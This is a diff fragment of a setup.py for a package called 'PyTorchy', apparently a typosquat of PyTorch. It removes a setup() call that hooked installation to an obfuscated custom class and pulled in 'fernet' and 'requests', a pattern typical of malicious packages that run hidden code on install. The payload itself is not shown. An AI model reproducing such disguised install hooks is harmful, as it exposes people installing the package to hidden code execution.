@@ -18,22 +18,5 @@ class LfFDmrfkbKXqzGEXAkdCFzodLYzLEPYBBuPXNhqZYUMFeWHndPUHbqesgCWLtvGIkAkFRIvBGR
             install.run(self)
 
 
-setup(
-    name="PyTorchy",
-    version=VERSION,
-    author="mIsPTGmSSFSujRYJgXqa",
-    author_email="sQJWN@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': LfFDmrfkbKXqzGEXAkdCFzodLYzLEPYBBuPXNhqZYUMFeWHndPUHbqesgCWLtvGIkAkFRIvBGRIyQmXUKqosaRgoWAnovmccAQEAnHGxaPrFLzmFbmQDpBOiMPfe,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
